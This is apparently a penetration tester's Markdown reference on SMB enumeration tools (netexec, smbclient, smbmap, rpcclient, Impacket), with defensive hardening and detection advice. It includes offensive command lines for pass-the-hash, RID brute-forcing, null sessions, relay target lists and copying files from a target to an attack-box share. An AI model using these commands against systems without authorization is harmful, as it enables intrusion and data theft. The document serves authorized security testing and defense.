# SMB

Windows file sharing, on **445/tcp** (direct) and **139/tcp** (legacy NetBIOS session). The highest-value protocol on an internal test: one valid credential turns SMB into a map of users, groups, password policy, OS versions, and every share the account can read.

This note is the **tool reference** — which tool to reach for and its main flags. The end-to-end workflow lives in [AD — Enumeration](../AD/Enumeration.md); execution and credential access live in [Lateral Movement & Credential Access](../AD/Lateral%20Movement%20%26%20Credential%20Access.md) and the [Impacket Toolkit](../AD/Impacket%20Toolkit.md).

> Authorized engagements only. Enumerate read-only first and check the **password policy before any spraying** — SMB is where you lock out a domain. Share contents are client data; see the handling rules in your engagement scope.

## Contents

- [Which tool for what](#which-tool-for-what)
- [netexec — sweep and enumerate](#netexec--sweep-and-enumerate)
- [smbclient — interactive file access](#smbclient--interactive-file-access)
- [smbmap — permission map](#smbmap--permission-map)
- [enum4linux-ng — one-shot report](#enum4linux-ng--one-shot-report)
- [rpcclient — MSRPC queries](#rpcclient--msrpc-queries)
- [nmap NSE — at subnet scale](#nmap-nse--at-subnet-scale)
- [Impacket — protocol level](#impacket--protocol-level)
- [smbserver.py — receive files on your box](#smbserverpy--receive-files-on-your-box)
- [What to record for the report](#what-to-record-for-the-report)
- [Defense / detection](#defense--detection)
- [Related](#related)

## Which tool for what

| Tool | Reach for it when | Strength |
| --- | --- | --- |
| **netexec** (`nxc`) | Default. Anything across more than one host | Sweeps a /24, tests creds everywhere, enumerates in one pass |
| **smbclient** | You need to actually browse and pull files | Interactive FTP-like shell; ships with Samba, on every Kali |
| **smbmap** | "What can this account read and write?" | Clean per-share READ/WRITE map, recursive listing |
| **enum4linux-ng** | First look at a single host or DC | One command, full structured report, JSON/YAML output |
| **rpcclient** | netexec's enumeration is blocked | Raw MSRPC queries — works when wrappers fail |
| **nmap NSE** | Signing, dialects and vulns at scale | Already in your scan; see [nmap](nmap.md) |
| **Impacket** | Protocol-level work and exec | Python, scriptable; see [Impacket Toolkit](../AD/Impacket%20Toolkit.md) |

Null session (`-u '' -p ''`) and guest (`-u guest -p ''`) are always the first two things to try — a surprising number of hosts still allow one.

## netexec — sweep and enumerate

Successor to CrackMapExec (which is archived — `cme` is dead, use `nxc`). Flags below verified against current NetExec source.

```bash
nxc smb 10.10.10.0/24                                  # sweep: hostname, domain, OS, signing, SMBv1
nxc smb 10.10.10.0/24 -u <user> -p <pass>               # where do these creds work? ("Pwn3d!" = local admin)
nxc smb <target> -u <user> -p <pass> --local-auth       # local account, not domain
nxc smb <target> -u <user> -H <nthash>                  # pass-the-hash
```

| Flag | Does (from source help) |
| --- | --- |
| `--shares` | "Enumerate shares and access" — optionally filter: `--shares read`, `--shares write`, `--shares read,write` |
| `--filter-shares READ WRITE` | Filter shares by access level |
| `--users [USER]` | "Enumerate domain users" — name one to query just that user |
| `--groups [GROUP]` | "Enumerate domain groups" — name one to list its members |
| `--local-groups [GROUP]` | Same for local groups |
| `--computers` | Enumerate computer accounts |
| `--pass-pol` | "dump password policy" — **run this before any spraying** |
| `--rid-brute [MAX_RID]` | "Enumerate users by bruteforcing RIDs" (default 4000) — works when `--users` is blocked |
| `--smb-sessions` | "Enumerate active smb sessions" |
| `--reg-sessions` | Sessions via Remote Registry |
| `--loggedon-users` | "Enumerate logged on users" — finds where admins are |
| `--disks` / `--interfaces` | Enumerate disks / network interfaces (interfaces reveal other subnets to [pivot](../Networking/Pivoting%20%26%20Tunneling.md) into) |
| `--spider <SHARE>` | Spider a share; pair with `--pattern`, `--regex`, `--depth`, `--content` |
| `--get-file <remote> <local>` | Pull one file |
| `--put-file <local> <remote>` | Push one file |
| `--gen-relay-list <file>` | "outputs all hosts that don't require SMB signing" — your relay target list |
| `--no-smbv1` | Force SMBv1 off in the connection |
| `-M <module>` | Modules, e.g. `-M spider_plus` to index every readable file |

> **Flag drift worth knowing:** older cheatsheets say `--sessions`. Current netexec splits it into **`--smb-sessions`** and **`--reg-sessions`**. If a flag errors, `nxc smb --help` is the truth for your build.

Credential dumping flags (`--sam`, `--lsa`, `--ntds`, `--dpapi`, `--laps`) need local admin and are covered in [Lateral Movement & Credential Access](../AD/Lateral%20Movement%20%26%20Credential%20Access.md).

## smbclient — interactive file access

```bash
smbclient -L //<target> -N                              # list shares, no credentials
smbclient -L //<target> -U '<domain>\<user>%<pass>'     # list shares, authenticated
smbclient "//<target>/<share>" -N                       # connect anonymously
smbclient "//<target>/<share>" -U '<domain>\<user>%<pass>'
smbclient "//<target>/<share>" -U <user> --pw-nt-hash   # authenticate with an NT hash
smbclient "//<target>/<share>" -N -c 'ls'               # one command, non-interactive
```

Once connected:

| Command | Does |
| --- | --- |
| `ls` / `cd <dir>` | List / change directory |
| `get <file>` / `put <file>` | Download / upload one file |
| `prompt off` then `recurse on` then `mget *` | **Pull a whole tree non-interactively** |
| `more <file>` | Read a file without downloading it |
| `lcd <dir>` | Change the *local* directory downloads land in |
| `mask ""` | Clear the filename mask before a recursive `mget` |
| `tarmode` / `tar c <file>.tar` | Archive a share server-side |

Legacy hosts that only speak SMBv1 need the dialect forced:

```bash
smbclient -L //<target> -N --option='client min protocol=NT1'
smbclient -L //<target> -N -m SMB2                      # or pin a specific dialect
```

## smbmap — permission map

The fastest answer to "what can this account actually touch?"

```bash
smbmap -H <target> -u <user> -p <pass> -d <domain>      # per-share READ/WRITE map
smbmap -H <target> -u '' -p ''                          # null session
smbmap -H <target> -u <user> -p <pass> -r <share>       # list one share, top level
smbmap -H <target> -u <user> -p <pass> -R <share>       # recurse the whole tree
smbmap -H <target> -u <user> -p <pass> -R --dir-only    # structure only, no filenames
smbmap --host-file hosts.txt -u <user> -p <pass>        # many hosts
```

| Flag | Does |
| --- | --- |
| `-H` / `--host-file` | One target / a file of targets |
| `-u -p -d` | User, password, domain (`-p` accepts an LM:NT hash) |
| `-r <share>` / `-R <share>` | List / recursively list |
| `-s <share>` | Restrict to one share |
| `-A <pattern>` | Download files matching a regex — **scope-sensitive, be specific** |
| `-q` | Quiet |

## enum4linux-ng — one-shot report

Python rewrite of the original enum4linux. Best single command against a DC you know nothing about.

```bash
enum4linux-ng -A <target>                               # everything simple
enum4linux-ng -A -u <user> -p <pass> <target>           # authenticated, much richer
enum4linux-ng -A -oJ report <target>                    # also write report.json
enum4linux-ng -R <target>                               # RID cycling for users
```

`-A` expands to **`-U -G -S -P -O -N -I -L`** plus `nmblookup` — per its own help text:

| Flag | Gets |
| --- | --- |
| `-U` | Users via RPC |
| `-G` | Groups via RPC |
| `-S` | Shares via RPC |
| `-P` | **Password policy** via RPC |
| `-O` | OS information via RPC |
| `-N` | NetBIOS names lookup (like `nbtstat`) |
| `-I` | Printer information via RPC |
| `-L` | Extra domain info via LDAP — **DCs only** |
| `-C` | Services via RPC (not in `-A`) |
| `-R [size]` | RID cycling (not in `-A`) |
| `-H <nthash>` / `-K <ticket>` | Authenticate with a hash / Kerberos ticket |
| `-oJ` / `-oY` | JSON / YAML output — parse it instead of re-running |

## rpcclient — MSRPC queries

The fallback when the wrappers are blocked, and the most precise tool for domain policy.

```bash
rpcclient -U '' -N <target>                             # null session
rpcclient -U '<domain>\<user>%<pass>' <target>
rpcclient -U <user> --pw-nt-hash <target>
rpcclient -U '' -N <target> -c 'querydominfo'           # single command
```

| Command | Returns |
| --- | --- |
| `srvinfo` | OS version and server type |
| `querydominfo` | Domain name, server role, user count |
| `getdompwinfo` | **Password policy** — min length, complexity |
| `enumdomusers` | Users with their RIDs |
| `queryuser <rid>` | One user in detail, including `badpwdcount` and last logon |
| `enumdomgroups` | Groups with RIDs |
| `querygroupmem <rid>` | Members of a group |
| `netshareenumall` | All shares, including ones hidden from `-L` |
| `netsharegetinfo <share>` | A share's ACL |
| `lsaquery` | Domain SID |
| `lookupnames <name>` / `lookupsids <sid>` | Name to SID and back |
| `enumprivs` | Privileges the account holds |

## nmap NSE — at subnet scale

Already in your scan output; full detail in [nmap](nmap.md).

```bash
sudo nmap -p445 --open 10.10.10.0/24 -oA scans/smb                      # who's listening
sudo nmap -sC -p445 <target>                                             # default scripts (includes smb-os-discovery)
sudo nmap --script smb2-security-mode -p445 10.10.10.0/24                # signing posture across a subnet
sudo nmap --script smb-protocols -p445 <target>                          # which dialects, flags SMBv1
sudo nmap --script smb-enum-shares,smb-enum-users -p445 <target>         # not in the default category
sudo nmap --script "smb-vuln* and safe" -p445 <target>                   # known-vuln checks
```

`smb-os-discovery`, `smb-security-mode`, `smb2-security-mode` and `smb2-time` are in the `default` category, so `-sC` and `-A` run them for free. `smb-enum-shares`, `smb-enum-users` and the `smb-vuln-*` family are not — ask for them by name.

## Impacket — protocol level

| Script | Does |
| --- | --- |
| `smbclient.py <dom>/<user>:<pass>@<target>` | Interactive client, same idea as `smbclient` |
| `lookupsid.py <dom>/<user>:<pass>@<target>` | RID cycling to enumerate users |
| `samrdump.py <dom>/<user>:<pass>@<target>` | Users, groups and policy via SAMR |
| `netview.py -target <target> <dom>/<user>` | Sessions and logged-on users across hosts |
| `reg.py <dom>/<user>:<pass>@<target> query -keyName <key>` | Remote registry |

Target spec, install notes and the exec scripts (`psexec.py`, `smbexec.py`, `wmiexec.py`, `atexec.py`) are all in [Impacket Toolkit](../AD/Impacket%20Toolkit.md).

## smbserver.py — receive files on your box

The reverse direction: stand up a share on your attack box so a Windows host can copy to or from it. The standard way to move a file off a target that has no outbound HTTP.

```bash
# on the attack box, from your engagement evidence directory
impacket-smbserver share . -smb2support
impacket-smbserver share . -smb2support -user <u> -password <p>   # auth; some Windows builds require it
```

```cmd
:: on the Windows host
copy C:\path\file.txt \\<attack-ip>\share\
dir \\<attack-ip>\share\
```

Modern Windows refuses guest/unauthenticated SMB by default, so use the `-user`/`-password` form if an anonymous share is rejected. Shut it down when you're done — it's an open share on the engagement network.

## What to record for the report

Four things from SMB enumeration carry straight into findings:

| Finding | Where you saw it | Why it matters |
| --- | --- | --- |
| **SMB signing not required** | `nxc smb <subnet>` signing flag, `smb2-security-mode`, `--gen-relay-list` | NTLM relay path; a Group Policy one-liner fixes it |
| **SMBv1 enabled** | `nxc smb` sweep, `smb-protocols` | Deprecated, and the surface for the classic SMB RCE family |
| **Null or guest session permitted** | `-u '' -p ''`, `smbclient -L -N` | Unauthenticated disclosure of users, shares and policy |
| **Over-permissive share ACLs** | `smbmap`, `nxc --shares` | Where credentials, backups and config files actually leak from |

Quantify the share finding rather than dumping it: "the `Finance` share is readable by Domain Users and contains 1,400 files including `creds.xlsx`" is a finding; a copy of the share is an incident.

## Defense / detection

- **Require SMB signing** on servers *and* clients via Group Policy, and **disable SMBv1** entirely — see [3. Active Directory Hardening](../../Defense/System%20and%20Services%20Hardening/3.%20Active%20Directory%20Hardening.md) and [2. Windows Hardening](../../Defense/System%20and%20Services%20Hardening/2.%20Windows%20Hardening.md).
- **Block null/anonymous sessions:** `RestrictAnonymous` / `RestrictAnonymousSAM`, and don't leave `guest` enabled.
- **Least privilege on shares.** "Authenticated Users: Full Control" is the single most common root cause of credential leakage on an internal test.
- **Don't expose 445 to the internet**, and segment it internally — flat SMB reachability is what turns one foothold into domain-wide access.
- **Detect:** one source touching 445 on many hosts in a short window (that's a sweep); `--rid-brute` as a burst of SAMR lookups; Windows event **5140/5145** for share access, **4624 type 3** for network logons, **4625** bursts for spraying. See [Host-based logging on Windows](../../Defense/Logging/Host-based/Windows.md) and [Abnormal User Behavior](../../Defense/SOC2/Abnormal%20User%20Behavior.md).
- A sudden spike in a single account reading many shares is the spider step — alert on it.

## Related

[nmap](nmap.md) · [Metasploit](Metasploit.md) · [tmux](tmux.md) · [folder README](README.md) · [AD — Enumeration](../AD/Enumeration.md) · [Impacket Toolkit](../AD/Impacket%20Toolkit.md) · [Lateral Movement & Credential Access](../AD/Lateral%20Movement%20%26%20Credential%20Access.md) · [Password Attacks & Brute Forcing](../Networking/Password%20Attacks%20%26%20Brute%20Forcing.md) · [Remote Access & Getting a Shell](../Networking/Remote%20Access%20%26%20Getting%20a%20Shell.md)
